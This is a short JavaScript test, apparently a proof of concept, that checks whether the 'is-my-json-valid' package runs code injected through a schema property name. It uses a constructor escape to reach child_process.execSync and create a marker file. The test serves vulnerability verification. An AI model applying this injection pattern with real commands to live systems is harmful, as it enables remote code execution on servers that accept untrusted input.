test("Arbitrary code execution in is-my-json-valid", () => {
  expect.assertions(2);
  const fs = require("fs");
  const path = "./is-my-json-valid";
  try {
      fs.unlinkSync(path, function (err) {});
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  const validator = require("is-my-json-valid");
  const schema = {
    type: "object",
    properties: {
        "x[1 + (this.constructor.constructor('return process')().mainModule.require('child_process').execSync('touch ./is-my-json-valid'))]": {
        required: true,
        type: "string",
      },
    },
  };
  try {
    let validate = validator(schema);
    validate({});
  } catch (e) {console.log(e)}

   file_exist = fs.existsSync(path);
   expect(file_exist).toBe(true);
   fs.unlink(path, function (err) {});
});
